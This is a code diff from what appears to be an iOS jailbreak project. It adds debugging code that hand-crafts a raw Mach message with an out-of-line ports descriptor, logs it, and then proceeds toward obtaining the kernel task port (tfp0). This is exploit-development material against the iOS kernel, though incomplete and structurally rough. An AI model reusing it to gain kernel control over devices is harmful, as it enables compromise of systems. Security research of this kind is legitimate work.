@@ -122,7 +122,37 @@ function main() {
 			return value;
 		}, "\t"));
 		p0laris_log("here");
-	}
+	
+	var mess = shit_heap(0x1000);
+	var InP = mess;
+	var OutP = mess;
+
+	write_u32(InP + 0x18, 1);
+	write_u32(InP + 0x1c, 0x69);
+	write_u32(InP + 0x20, 0x420);
+	write_u32(InP + 0x24, ((19 << 16) + (MACH_MSG_OOL_PORTS_DESCRIPTOR << 24)));
+	write_u32(InP + 0x28, 0x1234);
+	write_u32(InP + 0x2c, 0x5678);
+	write_u32(InP + 0x30, 0x9999);
+	write_u32(InP + 0x0, 0x80001513);
+	write_u32(InP + 0x8, 0x4141);
+	write_u32(InP + 0xc, mig_get_reply_port());
+	write_u32(InP + 0x14, 3403);
+
+		p0laris_log("here");
+		var InP_ptr = new Request_r3(1, InP);
+		p0laris_log("here");
+
+	p0laris_log("%s", JSON.stringify(InP_ptr.deref(), function (key, value) {
+		if (typeof value === 'number') {
+			return "0x" + value.toString(16);
+		}
+
+		return value;
+	}, "\t"));
+}
+
+//	return;
 
 	var tfp0 = get_kernel_task();
 
